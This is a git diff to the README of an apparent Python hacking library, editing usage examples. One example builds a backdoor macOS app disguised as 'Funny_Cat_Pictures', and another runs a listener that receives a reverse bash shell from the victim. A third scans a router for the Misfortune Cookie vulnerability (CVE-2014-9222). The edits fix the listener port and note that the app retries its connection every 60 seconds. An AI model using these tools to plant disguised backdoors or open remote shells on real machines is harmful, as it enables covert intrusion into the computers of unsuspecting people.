@@ -52,13 +52,16 @@ bd = hacklib.Backdoor()
 bd.create('127.0.0.1', 9090, 'OSX', 'Funny_Cat_Pictures')
 # Takes the IP and port of the command server, the OS of the target, and the name of the .app
 ```
+Generated App:
+
+![Screenshot](http://i.imgur.com/BsBzCWA.png)
 
 Listen for connections with Server:
 ```python
 >>> import hacklib
->>> s = hacklib.Server(9091) # Bind server to port 9091
+>>> s = hacklib.Server(9090) # Bind server to port 9090
 >>> s.listen() 
-New connection ('127.0.0.1', 50011) # Prints this when a computer connects
+New connection ('127.0.0.1', 50011) # Target ran the app (connection retried every 60 seconds)
 bash: no job control in this shell
 bash$ whoami # Type a command
 leon
@@ -120,7 +123,7 @@ Misfortune Cookie Exploit (CVE-2014-9222) using PortScanner:
 >>> ps = hacklib.PortScanner()
 >>> ps.scan('192.168.1.1', (80, 81))
 Port 80:
-HTTP/1.1 404 Not Found
+HTTP/1.1 200
 Content-Type: text/html
 Transfer-Encoding: chunked
 Server: RomPager/4.07 UPnP/1.0
